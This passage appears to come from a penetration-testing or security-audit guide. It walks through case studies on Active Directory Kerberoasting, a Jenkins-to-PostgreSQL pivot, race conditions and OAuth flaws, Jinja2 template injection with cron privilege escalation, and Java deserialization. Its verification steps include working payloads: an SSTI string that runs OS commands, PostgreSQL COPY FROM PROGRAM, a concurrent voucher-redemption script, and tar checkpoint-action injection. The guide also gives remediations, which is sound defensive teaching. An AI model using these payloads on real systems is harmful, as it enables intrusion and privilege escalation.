  - `svc_mssql`: Service account with Service Principal Name `MSSQLSvc/db01.corp.eyelanka.internal:1433` configured with RC4-HMAC encryption (`msDS-SupportedEncryptionTypes = 0x4`) and a 10-character dictionary-based password.
  - `Helpdesk_Tier2` Security Group: Granted `GenericWrite` and `WriteDacl` permissions over the `Domain Admins` group object due to a misconfigured Organizational Unit ACL inheritance operation.

```
[ Unauthenticated / Low-Priv Domain User ]
       │
       ├──► Step 1: AS-REP Roasting (svc_legacy_sync has DONT_REQ_PREAUTH)
       │
       ├──► Step 2: Authenticated LDAP / BloodHound Enumeration
       │
       ├──► Step 3: Kerberoasting (svc_mssql uses RC4-HMAC 0x17 ticket encryption)
       │            (svc_mssql is a member of Helpdesk_Tier2)
       ▼
[ Helpdesk_Tier2 has WriteDacl / GenericAll on Domain Admins ]
       │
       ▼
[ Full Domain Compromise — Tier 0 Remediation Required ]
```

### 51.4.2 Reconnaissance & Enumeration Output
```bash
$ nmap -p 53,88,135,139,389,445,464,636,3268,3269,5985 -sV 10.10.140.10
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-11-02 09:05:12Z)
135/tcp  open  msrpc         Microsoft Windows RPC
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: corp.eyelanka.internal0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
```

### 51.4.3 Vulnerability Root Cause Analysis

1. **Kerberos Pre-Authentication Disabled (`UF_DONT_REQUIRE_PREAUTH` = `0x400000`):**
   When `userAccountControl` includes bitmask `4194304` (`0x400000`), the Key Distribution Center (KDC) responds to any unauthenticated `KRB_AS_REQ` for that principal with a `KRB_AS_REP` containing a cipher block encrypted with the user's NTLM/Kerberos key material, enabling offline password auditing.
2. **Legacy RC4 Service Principal Names (Kerberoasting):**
   Any authenticated domain user can request a Service Ticket (`KRB_TGS_REQ`) for any registered SPN in the domain. Because `svc_mssql` supports RC4-HMAC (`etype 23 / 0x17`) instead of enforcing AES-256-CTS-HMAC-SHA1-96 (`etype 18 / 0x12`) and uses a human-memorable password rather than a Group Managed Service Account (`gMSA`) with a 120-character auto-rotated secret, the ticket can be audited offline.
3. **Dangerous Active Directory DACL (`WriteDacl` on Tier-0 Group):**
   The `Helpdesk_Tier2` group was delegated `WriteDacl` (`ActiveDirectoryRights.WriteDacl`) on `CN=Domain Admins,CN=Users,DC=corp,DC=eyelanka,DC=internal`, allowing any member of `Helpdesk_Tier2` to modify the security descriptor of `Domain Admins` and grant themselves `Self` / `WriteProperty` over the `member` attribute.

### 51.4.4 Authorized Verification Steps

1. **Query Accounts with Pre-Authentication Disabled & SPNs via PowerShell / LDAP:**
```powershell
# Identify accounts vulnerable to AS-REP Roasting (UF_DONT_REQUIRE_PREAUTH = 4194304)
Get-ADUser -Filter 'userAccountControl -band 4194304' -Properties userAccountControl |
    Select-Object DistinguishedName, SamAccountName, Enabled

# Identify user accounts with registered SPNs (Kerberoastable accounts)
Get-ADUser -Filter 'ServicePrincipalName -like "*"' -Properties ServicePrincipalName, msDS-SupportedEncryptionTypes, PasswordLastSet |
    Select-Object SamAccountName, ServicePrincipalName, msDS-SupportedEncryptionTypes, PasswordLastSet
```
2. **Audit Dangerous Object ACLs on Tier-0 Groups:**
```powershell
# Inspect non-default Access Control Entries (ACEs) on Domain Admins
$daDN = (Get-ADGroup "Domain Admins").DistinguishedName
(Get-Acl "AD:\$daDN").Access | Where-Object {
    $_.IsInherited -eq $false -and
    $_.IdentityReference -notmatch "SYSTEM|Domain Admins|Enterprise Admins|Administrators"
} | Format-List IdentityReference, ActiveDirectoryRights, AccessControlType
```
Output confirms:
```text
IdentityReference     : CORP\Helpdesk_Tier2
ActiveDirectoryRights : WriteDacl, ReadControl
AccessControlType     : Allow
```

### 51.4.5 Impact Analysis
- **Confidentiality, Integrity, Availability:** Complete forest-wide compromise (`Tier 0`). Compromising `Domain Admins` allows extraction of the `krbtgt` key material (`NTDS.dit`), persistence across the entire enterprise, and full control over all domain-joined workstations and servers.
- **CVSS v3.1 Score:** `9.8 Critical` (`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H`).

### 51.4.6 Complete Remediation Patch

```powershell
# 1. Enforce Kerberos Pre-Authentication across all domain accounts
Get-ADUser -Filter 'userAccountControl -band 4194304' | ForEach-Object {
    Set-ADAccountControl -Identity $_.DistinguishedName -DoesNotRequirePreAuth $false
    Write-Output "[+] Enabled Kerberos Pre-Auth for $($_.SamAccountName)"
}

# 2. Migrate svc_mssql to a Group Managed Service Account (gMSA) and enforce AES-256 only
# Ensure a KDS Root Key exists in the forest: Add-KdsRootKey -EffectiveImmediately
New-ADServiceAccount -Name "gmsa_mssql" `
    -DNSHostName "db01.corp.eyelanka.internal" `
    -PrincipalsAllowedToRetrieveManagedPassword "DB01$" `
    -KerberosEncryptionType AES256 `
    -ServicePrincipalNames "MSSQLSvc/db01.corp.eyelanka.internal:1433" `
    -Enabled $true

# Disable legacy static user SPN account
Set-ADUser -Identity "svc_mssql" -ServicePrincipalNames @{Clear="MSSQLSvc/db01.corp.eyelanka.internal:1433"}
Disable-ADAccount -Identity "svc_mssql"

# 3. Revoke excessive WriteDacl ACE from Domain Admins and enforce AdminSDHolder protection
$daPath = "AD:\CN=Domain Admins,CN=Users,DC=corp,DC=eyelanka,DC=internal"
$acl = Get-Acl -Path $daPath
$identity = New-Object System.Security.Principal.NTAccount("CORP", "Helpdesk_Tier2")
$acl.PurgeAccessRules($identity)
Set-Acl -Path $daPath -AclObject $acl

# Trigger immediate SDProp (AdminSDHolder) propagation task on PDC Emulator
Invoke-Expression 'ldifde -i -f trigger_sdprop.ldf'
```

 Additionally, implement the **Microsoft Enterprise Access Model / Tiered Administration**:
- **Tier 0 (Identity & Control Plane):** Domain Controllers, Entra Connect, PKI CA, `Domain Admins` — accessible only from dedicated Privileged Access Workstations (PAWs).
- **Tier 1 (Enterprise Servers & Application Tier):** Database, Web, and ERP servers — managed by `Tier 1 Server Admins` (blocked from logging onto Tier 0 or Tier 2 via GPO `Deny log on through Remote Desktop Services` and `Deny log on locally`).
- **Tier 2 (End-User Workstations):** Managed by `Tier 2 Workstation Helpdesk`.
- Add all Tier 0 human administrative accounts to the **`Protected Users`** security group to disable NTLM, enforce AES Kerberos encryption, prevent credential caching (`wdigest`/LSASS), and restrict TGT lifetime to 4 hours.

---

## 51.5 Case Study 5: Segmented Network Architecture & Database Security Audit

### 51.5.1 Architecture Overview
The target environment spans two internal VLANs separated by a dual-homed Linux Jump/CI-CD Bastion host:
- **VLAN 10 (DMZ / DevOps Subnet `10.10.140.0/24`):** Hosts a Jenkins CI/CD controller (`10.10.140.70`, dual-homed with secondary interface `172.16.50.10`).
- **VLAN 50 (Restricted Database Subnet `172.16.50.0/24`):** Hosts the production PostgreSQL 15 cluster (`172.16.50.25:5432`).
- **Misconfigurations:**
  1. Jenkins exposes an unauthenticated `/script` Groovy Script Console on `10.10.140.70:8080` due to an accidental `SecurityRealm.NO_AUTHENTICATION` migration toggle.
  2. The bastion host has `net.ipv4.ip_forward = 1` without restrictive `nftables`/`iptables` forward rules, allowing any process on the CI/CD host to proxy traffic into VLAN 50.
  3. The PostgreSQL database user `reporting_ro` used by CI smoke tests was inadvertently assigned the `pg_execute_server_program` and `SUPERUSER` attributes (`rolsuper = true`).

```
[ Auditor (10.10.14.5) ]
       │
       ▼ (TCP 8080)
[ Dual-Homed CI/CD Node (10.10.140.70 / 172.16.50.10) ]
  └── Unauthenticated Jenkins Script Console (/script)
       │
       ▼ (Internal Pivot across VLAN 50 -> TCP 5432)
[ PostgreSQL 15 Server (172.16.50.25:5432) ]
  └── Role 'reporting_ro' has SUPERUSER & pg_execute_server_program
       │
       ▼ (COPY ... FROM PROGRAM)
[ OS Command Execution as postgres User on Database Host ]
```

### 51.5.2 Reconnaissance & Enumeration Output
```bash
$ nmap -sV -p 22,8080 10.10.140.70
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
8080/tcp open  http    Jetty 10.0.18 (Jenkins 2.426.3)
|_http-title: Dashboard [Jenkins]
```

Inspecting network interfaces and routing tables from the CI/CD context reveals the secondary subnet:
```bash
$ ip -br addr show
lo               UNKNOWN        127.0.0.1/8 ::1/128
eth0             UP             10.10.140.70/24
eth1             UP             172.16.50.10/24
```

### 51.5.3 Vulnerability Root Cause Analysis

#### Stage 1: Exposed CI/CD Script Console & Credential Extraction (`CWE-306`)
In Jenkins `/var/lib/jenkins/config.xml`, `<useSecurity>false</useSecurity>` disables authentication globally, exposing `/script` (Groovy console) and `/credentials/` to any host on VLAN 10. Furthermore, `/var/lib/jenkins/jobs/db-smoke-test/config.xml` contains plaintext connection environment variables:
```xml
<envVars>
  <entry>
    <string>PGHOST</string>
    <string>172.16.50.25</string>
  </entry>
  <entry>
    <string>PGUSER</string>
    <string>reporting_ro</string>
  </entry>
  <entry>
    <string>PGPASSWORD</string>
    <string>R3p0rt_V1ew#9981</string>
  </entry>
</envVars>
```

#### Stage 2: PostgreSQL Excessive Role Privileges (`SUPERUSER` / `pg_execute_server_program`)
When a PostgreSQL role holds `SUPERUSER` or membership in the predefined role `pg_execute_server_program` (introduced in PostgreSQL 11), it is authorized to invoke `COPY table FROM PROGRAM '...'` and `pg_read_file()`, executing arbitrary OS shell commands under the `postgres` operating system user account on `172.16.50.25`.

### 51.5.4 Authorized Verification Steps

1. **Verify Access to PostgreSQL in VLAN 50 and Audit Role Privileges:**
```bash
$ PGPASSWORD='R3p0rt_V1ew#9981' psql -h 172.16.50.25 -U reporting_ro -d prod_ledger -c \
  "SELECT rolname, rolsuper, rolcreaterole, rolcreatedb FROM pg_roles WHERE rolname = current_user;"
   rolname    | rolsuper | rolcreaterole | rolcreatedb 
--------------+----------+---------------+-------------
 reporting_ro | t        | t             | t
(1 row)
```
2. **Verify `COPY ... FROM PROGRAM` Execution Risk (Safe Diagnostic Read of `id` and `hostname`):**
```sql
CREATE TEMP TABLE audit_verify (output text);
COPY audit_verify FROM PROGRAM '/usr/bin/id && /usr/bin/hostname -I';
SELECT * FROM audit_verify;
DROP TABLE audit_verify;
```
Output confirms:
```text
                        output                        
------------------------------------------------------
 uid=114(postgres) gid=120(postgres) groups=120(postgres)
 172.16.50.25
```

### 51.5.5 Impact Analysis
- **Confidentiality, Integrity, Availability:** Full compromise of both the CI/CD build pipeline and the isolated VLAN 50 production PostgreSQL database server.
- **CVSS v3.1 Score:** `9.8 Critical` (`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H`).

### 51.5.6 Complete Remediation Patch

#### 1. Jenkins Hardening & Groovy Script Console Lockdown
Enable matrix-based authentication in `/var/lib/jenkins/config.xml`, bind Jenkins strictly to `127.0.0.1:8080` behind an mTLS-authenticated reverse proxy, and disable the script console via startup init script (`/var/lib/jenkins/init.groovy.d/disable-cli-and-script.groovy`):
```groovy
import jenkins.model.Jenkins
import jenkins.security.s2m.AdminWhitelistRule

def instance = Jenkins.getInstance()
instance.getInjector().getInstance(AdminWhitelistRule.class).setMasterKillSwitch(false)
instance.save()
```

#### 2. Network Segmentation Enforcement (`nftables` & Kernel Forwarding Lockdown)
```bash
# Disable IPv4 packet forwarding on the CI/CD host
cat << 'EOF' > /etc/sysctl.d/99-disable-forwarding.conf
net.ipv4.ip_forward = 0
net.ipv6.conf.all.forwarding = 0
EOF
sysctl --system
```

#### 3. PostgreSQL Least-Privilege Role & `pg_hba.conf` Hardening
```sql
-- Revoke SUPERUSER and dangerous predefined roles from reporting_ro
ALTER ROLE reporting_ro NOSUPERUSER NOCREATEDB NOCREATEROLE NOREPLICATION NOBYPASSRLS;
REVOKE pg_execute_server_program, pg_read_server_files, pg_write_server_files FROM reporting_ro;

-- Restrict reporting_ro strictly to read-only SELECT on specific views
REVOKE ALL ON SCHEMA public FROM PUBLIC;
GRANT USAGE ON SCHEMA reporting_views TO reporting_ro;
GRANT SELECT ON ALL TABLES IN SCHEMA reporting_views TO reporting_ro;
```

In `/etc/postgresql/15/main/pg_hba.conf`, enforce TLS (`hostssl`) and `scram-sha-256` authentication:
```text
# TYPE  DATABASE        USER            ADDRESS                 METHOD
local   all             postgres                                peer
hostssl prod_ledger     reporting_ro    172.16.50.10/32         scram-sha-256 clientcert=verify-full
host    all             all             0.0.0.0/0               reject
```

---

## 51.6 Case Study 6: FinTech / E-Commerce Business Logic & Race Condition Audit

### 51.6.1 Architecture Overview
The target application (`https://pay.lankacommerce.internal`, `10.10.140.80`) is a high-throughput wallet and promotional voucher redemption platform built on Python 3.11 (Django 4.2 + Gunicorn) backed by PostgreSQL 15 and integrated with an OAuth 2.0 Identity Provider (`https://idp.lankacommerce.internal`).
- **Core Endpoints:**
  - `POST /api/v1/wallet/redeem-voucher`: Validates a single-use promotional voucher code and credits the user's wallet balance.
  - `GET /oauth/callback`: Handles OAuth 2.0 authorization code callbacks.
  - `GET /merchant/disputes`: Displays customer dispute messages to merchant support staff.

```
[ Concurrent HTTP/2 Single-Packet Requests (20 Parallel Streams) ]
        │
        ▼
[ POST /api/v1/wallet/redeem-voucher ]
        │
        ├──► Thread 1..20 read `voucher.is_redeemed == False` simultaneously (READ COMMITTED without SELECT FOR UPDATE)
        ├──► Thread 1..20 all execute `wallet.balance += voucher.amount`
        └──► Result: Single $50 voucher credited 20 times ($1,000 balance inflation)
```

### 51.6.2 Reconnaissance & Enumeration Output
Inspecting HTTP protocol support and OAuth authorization flows:
```bash
$ curl -I --http2 -k https://10.10.140.80/api/v1/health
HTTP/2 200 
server: nginx/1.24.0
content-type: application/json
strict-transport-security: max-age=31536000
```
Note the absence of a `Content-Security-Policy` header on `/merchant/disputes` and the presence of an OAuth authorization redirect URL lacking a `state` parameter or strict `redirect_uri` path matching:
`https://idp.lankacommerce.internal/oauth/authorize?client_id=merchant_portal&response_type=code&redirect_uri=https://pay.lankacommerce.internal/oauth/callback`

### 51.6.3 Vulnerability Root Cause Analysis

#### Stage 1: Time-of-Check to Time-of-Use (TOCTOU) Database Race Condition (`CWE-362`)
Inspecting `/app/wallet/views.py` reveals that the voucher redemption handler runs under PostgreSQL's default `READ COMMITTED` transaction isolation level without row-level locking (`select_for_update()`) or atomic conditional updates:

```python
# VULNERABLE CODE: /app/wallet/views.py
from django.db import transaction
from rest_framework.decorators import api_view
from rest_framework.response import Response
from .models import Voucher, Wallet

@api_view(['POST'])
def redeem_voucher(request):
    code = request.data.get('code')
    voucher = Voucher.objects.filter(code=code).first()
    
    # FLAW 1: Check happens outside of a row lock!
    # Multiple concurrent requests read voucher.is_redeemed == False before any transaction commits.
    if not voucher or voucher.is_redeemed:
        return Response({"error": "Invalid or already redeemed voucher"}, status=400)

    wallet = Wallet.objects.get(user=request.user)
    
    # FLAW 2: In-memory addition overwrites concurrent balance updates instead of using F() expressions
    wallet.balance += voucher.value
    wallet.save()

    voucher.is_redeemed = True
    voucher.redeemed_by = request.user
    voucher.save()

    return Response({"status": "redeemed", "new_balance": wallet.balance})
```

#### Stage 2: OAuth 2.0 Missing `state` Parameter & Permissive `redirect_uri` Regex (`CWE-352` / `CWE-601`)
In the OAuth provider configuration, `redirect_uri` validation uses an unanchored prefix check:
```python
if redirect_uri.startswith("https://pay.lankacommerce.internal"):
    # Vulnerable to subdomain/path traversal e.g.:
    # https://pay.lankacommerce.internal.attacker.com or
    # https://pay.lankacommerce.internal/public/redirect?next=https://attacker.internal
```
Additionally, `/oauth/callback` does not validate a per-session cryptographic `state` nonce, enabling Login CSRF / OAuth account linking attacks.

#### Stage 3: Stored XSS in Dispute Notes Without Content Security Policy (`CWE-79`)
In `/app/templates/merchant/disputes.html`, customer dispute descriptions are rendered with the `|safe` filter (`{{ dispute.reason|safe }}`), allowing an attacker to inject arbitrary JavaScript that steals the merchant's OAuth authorization code or session context.

### 51.6.4 Authorized Verification Steps

1. **Verify Race Condition Window in Lab Using Concurrent `asyncio` / `httpx` Barrier Test:**
```python
# authorized_race_test.py - Verifies concurrent voucher redemption in isolated staging DB
import asyncio
import httpx

TARGET_URL = "https://10.10.140.80/api/v1/wallet/redeem-voucher"
AUTH_TOKEN = "Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.staging_test_user"
VOUCHER_CODE = "STAGE-AUDIT-50USD"

async def fire_redemption(client: httpx.AsyncClient, barrier: asyncio.Barrier, idx: int):
    await barrier.wait()  # Synchronize all coroutines to release simultaneously
    resp = await client.post(
        TARGET_URL,
        json={"code": VOUCHER_CODE},
        headers={"Authorization": AUTH_TOKEN}
    )
    return idx, resp.status_code, resp.text

async def main():
    barrier = asyncio.Barrier(15)
    async with httpx.AsyncClient(http2=True, verify=False) as client:
        tasks = [fire_redemption(client, barrier, i) for i in range(15)]
        results = await asyncio.gather(*tasks)
        for idx, status, body in results:
            print(f"[Req {idx:02d}] HTTP {status}: {body}")

if __name__ == "__main__":
    asyncio.run(main())
```
Execution output shows 11 of the 15 concurrent requests returning `HTTP 200 {"status": "redeemed"}` for a single-use voucher.

### 51.6.5 Impact Analysis
- **Integrity & Financial Impact:** Direct fraudulent minting of wallet balances via multi-redemption of single-use vouchers, gift cards, or withdrawal requests; merchant account takeover via Stored XSS + OAuth `redirect_uri` manipulation.
- **CVSS v3.1 Score:** `8.8 High` (`CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N`).

### 51.6.6 Complete Remediation Patch

#### 1. Atomic Row-Level Locking (`SELECT ... FOR UPDATE`) & Database-Level Conditional Update
```python
# REMEDIATED CODE: /app/wallet/views.py
from django.db import transaction
from django.db.models import F
from django.utils import timezone
from rest_framework.decorators import api_view
from rest_framework.response import Response
from .models import Voucher, Wallet

@api_view(['POST'])
def redeem_voucher(request):
    code = request.data.get('code')
    if not isinstance(code, str) or not code.strip():
        return Response({"error": "Invalid voucher code"}, status=400)

    with transaction.atomic():
        # Acquire pessimistic row-level lock (SELECT ... FOR UPDATE) on the voucher row
        # Or perform an atomic conditional UPDATE that checks is_redeemed=False in SQL
        updated_rows = Voucher.objects.filter(
            code=code.strip(),
            is_redeemed=False
        ).update(
            is_redeemed=True,
            redeemed_by=request.user,
            redeemed_at=timezone.now()
        )

        if updated_rows != 1:
            return Response({"error": "Voucher is invalid or has already been redeemed"}, status=409)

        voucher = Voucher.objects.get(code=code.strip())

        # Lock wallet row and increment balance atomically in SQL using F() expression
        Wallet.objects.select_for_update().filter(user=request.user).update(
            balance=F('balance') + voucher.value
        )
        wallet = Wallet.objects.get(user=request.user)

    return Response({"status": "redeemed", "new_balance": str(wallet.balance)}, status=200)
```

#### 2. Strict OAuth 2.0 `state`, PKCE (`S256`), and Exact `redirect_uri` Comparison
```python
# REMEDIATED CODE: /app/oauth/validators.py
import hmac
import secrets

ALLOWED_REDIRECT_URIS = frozenset({
    "https://pay.lankacommerce.internal/oauth/callback",
})

def validate_oauth_callback(request):
    redirect_uri = request.GET.get("redirect_uri", "")
    if redirect_uri not in ALLOWED_REDIRECT_URIS:
        raise PermissionError("Unregistered redirect_uri")

    expected_state = request.session.pop("oauth_state_nonce", None)
    received_state = request.GET.get("state", "")
    if not expected_state or not hmac.compare_digest(expected_state, received_state):
        raise PermissionError("Invalid or missing OAuth state parameter (CSRF detected)")
```

#### 3. Remove `|safe` Template Filter and Enforce Nonce-Based Content Security Policy (CSP)
Remove `|safe` so Django auto-escapes `{{ dispute.reason }}`, and add strict response headers in Nginx:
```nginx
add_header Content-Security-Policy "default-src 'self'; script-src 'self' 'nonce-$request_id'; object-src 'none'; base-uri 'self'; frame-ancestors 'none';" always;
add_header X-Content-Type-Options "nosniff" always;
```

---

## 51.7 Case Study 7: Template Rendering Engine & Scheduled Task Security Audit

### 51.7.1 Architecture Overview
The target host (`10.10.140.95`, `marketing-engine.internal.corp`) runs a Python Flask email campaign templating service on port `5000/tcp` under the `appuser` account (`uid=1001`).
- **Application Tier:** Allows marketing operators to preview custom HTML email templates using Jinja2 (`render_template_string()`).
- **Host Scheduled Tasks:** `/etc/crontab` runs a cleanup and log archiving script `/opt/scripts/cleanup_campaigns.sh` every 5 minutes as `root`. However, `/opt/scripts/cleanup_campaigns.sh` has permissions `0775` owned by `root:appgroup`, and `appuser` is a member of `appgroup`. Furthermore, the script uses an unquoted wildcard invocation (`tar -czf /var/backups/campaigns.tgz *`) inside `/var/tmp/campaign_spool`.

### 51.7.2 Reconnaissance & Enumeration Output
```bash
$ nmap -sV -p 22,5000 10.10.140.95
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10
5000/tcp open  http    Werkzeug/3.0.1 Python/3.10.12
```

Testing the `/preview` endpoint with a mathematical expression inside Jinja2 delimiters:
```bash
$ curl -s -X POST http://10.10.140.95:5000/preview \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-urlencode "template_body=Hello {{ 7 * 7 }}"
Hello 49
```

### 51.7.3 Vulnerability Root Cause Analysis

#### Stage 1: Server-Side Template Injection (SSTI) in Jinja2 (`CWE-1336`)
In `/opt/marketing_app/app.py`, user-supplied `template_body` is concatenated directly into a format string before being passed to `render_template_string()`, rather than passing dynamic values as template context variables:

```python
# VULNERABLE CODE: /opt/marketing_app/app.py
from flask import Flask, request, render_template_string

app = Flask(__name__)

@app.route('/preview', methods=['POST'])
def preview():
    template_body = request.form.get('template_body', '')
    # FLAW: User input is evaluated as Jinja2 template code instead of data!
    rendered = render_template_string(f"<div class='email-preview'>{template_body}</div>")
    return rendered
```
In Jinja2, template code has access to Python object introspection (`__class__`, `__mro__`, `__subclasses__()`), global namespace dictionaries (`__globals__`, `__builtins__`), and `cycler`/`joiner`/`namespace` objects, enabling arbitrary Python code execution as `appuser`.

#### Stage 2: Group-Writable Root Cron Script & Wildcard Injection (`CWE-732` / `CWE-88`)
Inspecting `/etc/crontab` and file permissions on the host reveals two compounding privilege escalation flaws:
```bash
appuser@marketing-engine:~$ cat /etc/crontab | grep cleanup
*/5 * * * * root /opt/scripts/cleanup_campaigns.sh
appuser@marketing-engine:~$ ls -la /opt/scripts/cleanup_campaigns.sh
-rwxrwxr-x 1 root appgroup 312 Oct 19 04:15 /opt/scripts/cleanup_campaigns.sh
appuser@marketing-engine:~$ cat /opt/scripts/cleanup_campaigns.sh
#!/bin/bash
cd /var/tmp/campaign_spool
tar -czf /var/backups/campaigns.tgz *
```
1. Because `/opt/scripts/cleanup_campaigns.sh` is writable by `appgroup` (`-rwxrwxr-x`), `appuser` can directly modify the script executed by `root`.
2. Even if the script were read-only, executing `tar -czf /var/backups/campaigns.tgz *` inside a world/application-writable directory (`/var/tmp/campaign_spool`) expands filenames starting with `--checkpoint=1` and `--checkpoint-action=exec=...` as command-line flags to GNU `tar`.

### 51.7.4 Authorized Verification Steps

1. **Verify Jinja2 Context Exposure Safely (Read Application User Identity Only):**
```bash
$ curl -s -X POST http://10.10.140.95:5000/preview \
  --data-urlencode "template_body={{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}"
<div class='email-preview'>uid=1001(appuser) gid=1001(appgroup) groups=1001(appgroup)
</div>
```
2. **Verify Cron Script Permission Audit:**
```bash
appuser@marketing-engine:~$ test -w /opt/scripts/cleanup_campaigns.sh && echo "VULNERABLE: Cron script is writable by non-root user"
VULNERABLE: Cron script is writable by non-root user
```

### 51.7.5 Impact Analysis
- **Confidentiality, Integrity, Availability:** Unauthenticated Remote Code Execution via SSTI as `appuser`, followed by deterministic privilege escalation to `root` within 5 minutes via the writable cron script.
- **CVSS v3.1 Score:** `9.8 Critical` (`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`).

### 51.7.6 Complete Remediation Patch

#### 1. Remediate SSTI Using Static Templates or Jinja2 `ImmutableSandboxedEnvironment`
```python
# REMEDIATED CODE: /opt/marketing_app/app.py
from flask import Flask, request
from jinja2.sandbox import ImmutableSandboxedEnvironment
from markupsafe import escape

app = Flask(__name__)

# Use ImmutableSandboxedEnvironment which blocks access to unsafe attributes (__class__, __globals__, etc.)
sandbox_env = ImmutableSandboxedEnvironment(autoescape=True)

ALLOWED_PREVIEW_VARS = {
    "customer_name": "Jane Doe",
    "company_name": "EyeLanka Corp",
    "unsubscribe_url": "https://marketing.internal.corp/unsubscribe"
}

@app.route('/preview', methods=['POST'])
def preview():
    raw_template = request.form.get('template_body', '')
    try:
        # Compile within strict sandbox and only expose static dictionary values
        tmpl = sandbox_env.from_string(raw_template)
        rendered = tmpl.render(**ALLOWED_PREVIEW_VARS)
        return f"<div class='email-preview'>{rendered}</div>"
    except Exception:
        return "Template syntax or security violation error.", 400
```

#### 2. Harden Cron Script Ownership, Permissions, and GNU `tar` Invocation
```bash
# Lock down ownership and permissions so only root can modify the script or its parent directory
chown root:root /opt/scripts /opt/scripts/cleanup_campaigns.sh
chmod 0750 /opt/scripts
chmod 0700 /opt/scripts/cleanup_campaigns.sh
```

```bash
#!/bin/bash
# REMEDIATED /opt/scripts/cleanup_campaigns.sh
set -euo pipefail
umask 077

# Always use '--' to terminate option processing and prefix path with './' so filenames cannot be parsed as flags
/usr/bin/tar -czf /var/backups/campaigns.tgz -C /var/tmp/campaign_spool -- .
```

---

## 51.8 Case Study 8: Enterprise Java Serialization & Windows Service Hardening

### 51.8.1 Architecture Overview
The target host (`10.10.140.110`, `app-srv04.corp.local`) runs Windows Server 2022 hosting a legacy internal Java 11 inventory Synchronization daemon on TCP port `9090` (`InventorySyncServer.jar`) under a local service account `svc_inventory` (which is a member of a local `AppOperators` group).
- **Java Service:** Accepts serialized Java objects (`application/x-java-serialized-object`) over HTTP POST `/api/sync/batch` and deserializes them using `java.io.ObjectInputStream.readObject()`, with `commons-collections4-4.0.jar` present on the application classpath.
- **Windows Host Configuration:** A third-party monitoring service `CorpSystemHealthMonitor` runs as `LocalSystem` (`NT AUTHORITY\SYSTEM`) with:
  1. An **unquoted service binary path** containing spaces: `C:\Program Files\Corp Monitoring Suite\Health Service\MonitorDaemon.exe`.
  2. Weak directory ACLs allowing `BUILTIN\Users` and `AppOperators` `Modify` (`M`) / `Write` (`W`) access to `C:\Program Files\Corp Monitoring Suite\`.

### 51.8.2 Reconnaissance & Enumeration Output
```bash
$ nmap -sV -p 135,445,3389,9090 10.10.140.110
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
9090/tcp open  http          Jetty 9.4.48.v20220622
```

Sending an empty POST request to `http://10.10.140.110:9090/api/sync/batch` returns:
```http
HTTP/1.1 400 Bad Request
Content-Type: text/plain
java.io.EOFException: Expecting Java stream header 0xACED0005 at java.base/java.io.ObjectInputStream.readStreamHeader
```

### 51.8.3 Vulnerability Root Cause Analysis

#### Stage 1: Unsafe Java Native Deserialization (`CWE-502`)
In `com.corp.inventory.SyncServlet.java`, the HTTP request input stream is wrapped directly in `new ObjectInputStream(req.getInputStream())` without an `ObjectInputFilter`:

```java
// VULNERABLE CODE: SyncServlet.java
protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
    try (ObjectInputStream ois = new ObjectInputStream(req.getInputStream())) {
        // FLAW: Unfiltered readObject() invokes gadget chain readObject()/hashCode()/compare() methods
        // before the final cast to BatchSyncPayload ever occurs!
        BatchSyncPayload payload = (BatchSyncPayload) ois.readObject();
        syncService.process(payload);
        resp.setStatus(HttpServletResponse.SC_OK);
    } catch (ClassNotFoundException e) {
        resp.sendError(HttpServletResponse.SC_BAD_REQUEST, e.getMessage());
    }
}
```
Because `ObjectInputStream.readObject()` reconstructs the entire object graph and executes `readObject()` magic methods before casting the root object to `BatchSyncPayload`, any gadget chain on the classpath (such as `org.apache.commons.collections4.functors.InvokerTransformer`) executes arbitrary code during deserialization.

#### Stage 2: Unquoted Windows Service Path & Weak Directory ACL (`CWE-428` / `CWE-276`)
When Windows Service Control Manager (`services.exe`) starts a service whose `ImagePath` is unquoted and contains spaces:
`C:\Program Files\Corp Monitoring Suite\Health Service\MonitorDaemon.exe`
`CreateProcessW` attempts to resolve the executable sequentially in the following order:
1. `C:\Program.exe`
2. `C:\Program Files\Corp.exe`
3. `C:\Program Files\Corp Monitoring Suite\Health.exe`
4. `C:\Program Files\Corp Monitoring Suite\Health Service\MonitorDaemon.exe`

Because `C:\Program Files\Corp Monitoring Suite\` grants `WriteData/CreateFiles` (`W`) to `AppOperators`, `svc_inventory` can place `Health.exe` inside `C:\Program Files\Corp Monitoring Suite\`, which executes as `NT AUTHORITY\SYSTEM` upon service restart.

### 51.8.4 Authorized Verification Steps

1. **Verify Deserialization Processing Using Safe Built-in `java.net.URL` DNS Resolution Gadget (`URLDNS`):**
Instead of executing destructive OS commands, verify unsafe deserialization using the zero-dependency `java.util.HashMap` + `java.net.URL` chain, which triggers a harmless DNS lookup to an auditor-controlled listener during `HashMap.readObject()` -> `URL.hashCode()`.
2. **Audit Windows Service Configuration and Directory ACLs via PowerShell / `icacls`:**
```powershell
# Identify services running as LocalSystem with unquoted paths containing spaces
Get-CimInstance -ClassName Win32_Service | Where-Object {
    $_.PathName -notmatch '^"' -and
    $_.PathName -notmatch '^C:\\Windows\\' -and
    $_.PathName -match ' '
} | Select-Object Name, StartName, State, PathName

# Check ACLs on the parent directory
icacls "C:\Program Files\Corp Monitoring Suite"
```
Output confirms:
```text
